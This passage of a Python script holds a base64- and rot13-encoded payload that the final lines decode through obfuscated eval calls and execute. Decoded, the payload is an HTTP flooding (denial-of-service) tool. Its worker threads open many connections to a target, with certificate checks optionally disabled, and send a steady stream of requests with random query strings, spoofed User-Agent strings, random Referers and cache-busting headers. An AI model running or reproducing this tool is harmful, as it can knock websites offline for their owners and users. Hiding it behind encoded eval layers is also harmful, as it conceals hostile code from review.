QogICAgICAgIHJldHVybiBvdXRfc3RyDQoNCg0KICAgIGRlZiBydW4oc2VsZik6DQoNCiAgICAgICAgaWYgREVCVUc6DQogICAgICAgICAgICBwcmludCgiU3RhcnRpbmcgd29ya2VyIHswfSIuZm9ybWF0KHNlbGYubmFtZSkpDQoNCiAgICAgICAgd2hpbGUgc2VsZi5ydW5uYWJsZToNCg0KICAgICAgICAgICAgdHJ5Og0KDQogICAgICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2Uoc2VsZi5ucl9zb2Nrcyk6DQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5zc2w6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBTU0xWRVJJRlk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYyA9IEhUVFBDTElFTlQuSFRUUFNDb25uZWN0aW9uKHNlbGYuaG9zdCwgc2VsZi5wb3J0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjID0gSFRUUENMSUVOVC5IVFRQU0Nvbm5lY3Rpb24oc2VsZi5ob3N0LCBzZWxmLnBvcnQsIGNvbnRleHQ9c3NsLl9jcmVhdGVfdW52ZXJpZmllZF9jb250ZXh0KCkpDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBjID0gSFRUUENMSUVOVC5IVFRQQ29ubmVjdGlvbihzZWxmLmhvc3QsIHNlbGYucG9ydCkNCg0KICAgICAgICAgICAgICAgICAgICBzZWxmLnNvY2tzLmFwcGVuZChjKQ0KDQogICAgICAgICAgICAgICAgZm9yIGNvbm5fcmVxIGluIHNlbGYuc29ja3M6DQoNCiAgICAgICAgICAgICAgICAgICAgKHVybCwgaGVhZGVycykgPSBzZWxmLmNyZWF0ZVBheWxvYWQoKQ0KDQogICAgICAgICAgICAgICAgICAgIG1ldGhvZCA9IHJhbmRvbS5jaG9pY2UoW01FVEhPRF9HRVQsIE1FVEhPRF9QT1NUXSkgaWYgc2VsZi5tZXRob2QgPT0gTUVUSE9EX1JBTkQgZWxzZSBzZWxmLm1ldGhvZA0KDQogICAgICAgICAgICAgICAgICAgIGNvbm5fcmVxLnJlcXVlc3QobWV0aG9kLnVwcGVyKCksIHVybCwgTm9uZSwgaGVhZGVycykNCg0KICAgICAgICAgICAgICAgIGZvciBjb25uX3Jlc3AgaW4gc2VsZi5zb2NrczoNCg0KICAgICAgICAgICAgICAgICAgICByZXNwID0gY29ubl9yZXNwLmdldHJlc3BvbnNlKCkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5pbmNDb3VudGVyKCkNCg0KICAgICAgICAgICAgICAgIHNlbGYuY2xvc2VDb25uZWN0aW9ucygpDQoNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBzZWxmLmluY0ZhaWxlZCgpDQogICAgICAgICAgICAgICAgaWYgREVCVUc6DQogICAgICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgcGFzcyAjIHNpbGVudGx5IGlnbm9yZQ0KDQogICAgICAgIGlmIERFQlVHOg0KICAgICAgICAgICAgcHJpbnQoIldvcmtlciB7MH0gY29tcGxldGVkIHJ1bi4gU2xlZXBpbmcuLi4iLmZvcm1hdChzZWxmLm5hbWUpKQ0KDQogICAgZGVmIGNsb3NlQ29ubmVjdGlvbnMoc2VsZik6DQogICAgICAgIGZvciBjb25uIGluIHNlbGYuc29ja3M6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcyAjIHNpbGVudGx5IGlnbm9yZQ0KDQoNCiAgICBkZWYgY3JlYXRlUGF5bG9hZChzZWxmKToNCg0KICAgICAgICByZXFfdXJsLCBoZWFkZXJzID0gc2VsZi5nZW5lcmF0ZURhdGEoKQ0KDQogICAgICAgIHJhbmRvbV9rZXlzID0gbGlzdChoZWFkZXJzLmtleXMoKSkNCiAgICAgICAgcmFuZG9tLnNodWZmbGUocmFuZG9tX2tleXMpDQogICAgICAgIHJhbmRvbV9oZWFkZXJzID0ge30NCg0KICAgICAgICBmb3IgaGVhZGVyX25hbWUgaW4gcmFuZG9tX2tleXM6DQogICAgICAgICAgICByYW5kb21faGVhZGVyc1toZWFkZXJfbmFtZV0gPSBoZWFkZXJzW2hlYWRlcl9uYW1lXQ0KDQogICAgICAgIHJldHVybiAocmVxX3VybCwgcmFuZG9tX2hlYWRlcnMpDQoNCiAgICBkZWYgZ2VuZXJhdGVRdWVyeVN0cmluZyhzZWxmLCBhbW1vdW50ID0gMSk6DQoNCiAgICAgICAgcXVlcnlTdHJpbmcgPSBbXQ0KDQogICAgICAgIGZvciBpIGluIHJhbmdlKGFtbW91bnQpOg0KDQogICAgICAgICAgICBrZXkgPSBzZWxmLmJ1aWxkYmxvY2socmFuZG9tLnJhbmRpbnQoMywxMCkpDQogICAgICAgICAgICB2YWx1ZSA9IHNlbGYuYnVpbGRibG9jayhyYW5kb20ucmFuZGludCgzLDIwKSkNCiAgICAgICAgICAgIGVsZW1lbnQgPSAiezB9PXsxfSIuZm9ybWF0KGtleSwgdmFsdWUpDQogICAgICAgICAgICBxdWVyeVN0cmluZy5hcHBlbmQoZWxlbWVudCkNCg0KICAgICAgICByZXR1cm4gJyYnLmpvaW4ocXVlcnlTdHJpbmcpDQoNCg0KICAgIGRlZiBnZW5lcmF0ZURhdGEoc2VsZik6DQoNCiAgICAgICAgcmV0dXJuQ29kZSA9IDANCiAgICAgICAgcGFyYW1fam9pbmVyID0gIj8iDQoNCiAgICAgICAgaWYgbGVuKHNlbGYudXJsKSA9PSAwOg0KICAgICAgICAgICAgc2VsZi51cmwgPSAnLycNCg0KICAgICAgICBpZiBzZWxmLnVybC5jb3VudCgiPyIpID4gMDoNCiAgICAgICAgICAgIHBhcmFtX2pvaW5lciA9ICImIg0KDQogICAgICAgIHJlcXVlc3RfdXJsID0gc2VsZi5nZW5lcmF0ZVJlcXVlc3RVcmwocGFyYW1fam9pbmVyKQ0KDQogICAgICAgIGh0dHBfaGVhZGVycyA9IHNlbGYuZ2VuZXJhdGVSYW5kb21IZWFkZXJzKCkNCg0KDQogICAgICAgIHJldHVybiAocmVxdWVzdF91cmwsIGh0dHBfaGVhZGVycykNCg0KICAgIGRlZiBnZW5lcmF0ZVJlcXVlc3RVcmwoc2VsZiwgcGFyYW1fam9pbmVyID0gJz8nKToNCg0KICAgICAgICByZXR1cm4gc2VsZi51cmwgKyBwYXJhbV9qb2luZXIgKyBzZWxmLmdlbmVyYXRlUXVlcnlTdHJpbmcocmFuZG9tLnJhbmRpbnQoMSw1KSkNCg0KICAgIGRlZiBnZXRVc2VyQWdlbnQoc2VsZik6DQoNCiAgICAgICAgaWYgc2VsZi51c2VyYWdlbnRzOg0KICAgICAgICAgICAgcmV0dXJuIHJhbmRvbS5jaG9pY2Uoc2VsZi51c2VyYWdlbnRzKQ0KDQogICAgICAgICMgTW96aWxsYS9bdmVyc2lvbl0gKFtzeXN0ZW0gYW5kIGJyb3dzZXIgaW5mb3JtYXRpb25dKSBbcGxhdGZvcm1dIChbcGxhdGZvcm0gZGV0YWlsc10pIFtleHRlbnNpb25zXQ0KDQogICAgICAgICMjIE1vemlsbGEgVmVyc2lvbg0KICAgICAgICBtb3ppbGxhX3ZlcnNpb24gPSAiTW96aWxsYS81LjAiICMgaGFyZGNvZGVkIGZvciBub3csIGFsbW9zdCBldmVyeSBicm93c2VyIGlzIG9uIHRoaXMgdmVyc2lvbiBleGNlcHQgSUU2DQoNCiAgICAgICAgIyMgU3lzdGVtIEFuZCBCcm93c2VyIEluZm9ybWF0aW9uDQogICAgICAgICMgQ2hvb3NlIHJhbmRvbSBPUw0KICAgICAgICBvcyA9IFVTRVJfQUdFTlRfUEFSVFNbJ29zJ11bcmFuZG9tLmNob2ljZShsaXN0KFVTRVJfQUdFTlRfUEFSVFNbJ29zJ10ua2V5cygpKSldDQogICAgICAgIG9zX25hbWUgPSByYW5kb20uY2hvaWNlKG9zWyduYW1lJ10pDQogICAgICAgIHN5c2luZm8gPSBvc19uYW1lDQoNCiAgICAgICAgIyBDaG9vc2UgcmFuZG9tIHBsYXRmb3JtDQogICAgICAgIHBsYXRmb3JtID0gVVNFUl9BR0VOVF9QQVJUU1sncGxhdGZvcm0nXVtyYW5kb20uY2hvaWNlKGxpc3QoVVNFUl9BR0VOVF9QQVJUU1sncGxhdGZvcm0nXS5rZXlzKCkpKV0NCg0KICAgICAgICAjIEdldCBCcm93c2VyIEluZm9ybWF0aW9uIGlmIGF2YWlsYWJsZQ0KICAgICAgICBpZiAnYnJvd3Nlcl9pbmZvJyBpbiBwbGF0Zm9ybSBhbmQgcGxhdGZvcm1bJ2Jyb3dzZXJfaW5mbyddOg0KICAgICAgICAgICAgYnJvd3NlciA9IHBsYXRmb3JtWydicm93c2VyX2luZm8nXQ0KDQogICAgICAgICAgICBicm93c2VyX3N0cmluZyA9IHJhbmRvbS5jaG9pY2UoYnJvd3NlclsnbmFtZSddKQ0KDQogICAgICAgICAgICBpZiAnZXh0X3ByZScgaW4gYnJvd3NlcjoNCiAgICAgICAgICAgICAgICBicm93c2VyX3N0cmluZyA9ICIlczsgJXMiICUgKHJhbmRvbS5jaG9pY2UoYnJvd3NlclsnZXh0X3ByZSddKSwgYnJvd3Nlcl9zdHJpbmcpDQoNCiAgICAgICAgICAgIHN5c2luZm8gPSAiJXM7ICVzIiAlIChicm93c2VyX3N0cmluZywgc3lzaW5mbykNCg0KICAgICAgICAgICAgaWYgJ2V4dF9wb3N0JyBpbiBicm93c2VyOg0KICAgICAgICAgICAgICAgIHN5c2luZm8gPSAiJXM7ICVzIiAlIChzeXNpbmZvLCByYW5kb20uY2hvaWNlKGJyb3dzZXJbJ2V4dF9wb3N0J10pKQ0KDQoNCiAgICAgICAgaWYgJ2V4dCcgaW4gb3MgYW5kIG9zWydleHQnXToNCiAgICAgICAgICAgIHN5c2luZm8gPSAiJXM7ICVzIiAlIChzeXNpbmZvLCByYW5kb20uY2hvaWNlKG9zWydleHQnXSkpDQoNCiAgICAgICAgdWFfc3RyaW5nID0gIiVzICglcykiICUgKG1vemlsbGFfdmVyc2lvbiwgc3lzaW5mbykNCg0KICAgICAgICBpZiAnbmFtZScgaW4gcGxhdGZvcm0gYW5kIHBsYXRmb3JtWyduYW1lJ106DQogICAgICAgICAgICB1YV9zdHJpbmcgPSAiJXMgJXMiICUgKHVhX3N0cmluZywgcmFuZG9tLmNob2ljZShwbGF0Zm9ybVsnbmFtZSddKSkNCg0KICAgICAgICBpZiAnZGV0YWlscycgaW4gcGxhdGZvcm0gYW5kIHBsYXRmb3JtWydkZXRhaWxzJ106DQogICAgICAgICAgICB1YV9zdHJpbmcgPSAiJXMgKCVzKSIgJSAodWFfc3RyaW5nLCByYW5kb20uY2hvaWNlKHBsYXRmb3JtWydkZXRhaWxzJ10pIGlmIGxlbihwbGF0Zm9ybVsnZGV0YWlscyddKSA+IDEgZWxzZSBwbGF0Zm9ybVsnZGV0YWlscyddWzBdICkNCg0KICAgICAgICBpZiAnZXh0ZW5zaW9ucycgaW4gcGxhdGZvcm0gYW5kIHBsYXRmb3JtWydleHRlbnNpb25zJ106DQogICAgICAgICAgICB1YV9zdHJpbmcgPSAiJXMgJXMiICUgKHVhX3N0cmluZywgcmFuZG9tLmNob2ljZShwbGF0Zm9ybVsnZXh0ZW5zaW9ucyddKSkNCg0KICAgICAgICByZXR1cm4gdWFfc3RyaW5nDQoNCiAgICBkZWYgZ2VuZXJhdGVSYW5kb21IZWFkZXJzKHNlbGYpOg0KDQogICAgICAgICMgUmFuZG9tIG5vLWNhY2hlIGVudHJpZXMNCiAgICAgICAgbm9DYWNoZURpcmVjdGl2ZXMgPSBbJ25vLWNhY2hlJywgJ21heC1hZ2U9MCddDQogICAgICAgIHJhbmRvbS5zaHVmZmxlKG5vQ2FjaGVEaXJlY3RpdmVzKQ0KICAgICAgICBuck5vQ2FjaGUgPSByYW5kb20ucmFuZGludCgxLCAobGVuKG5vQ2FjaGVEaXJlY3RpdmVzKS0xKSkNCiAgICAgICAgbm9DYWNoZSA9ICcsICcuam9pbihub0NhY2hlRGlyZWN0aXZlc1s6bnJOb0NhY2hlXSkNCg0KICAg'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))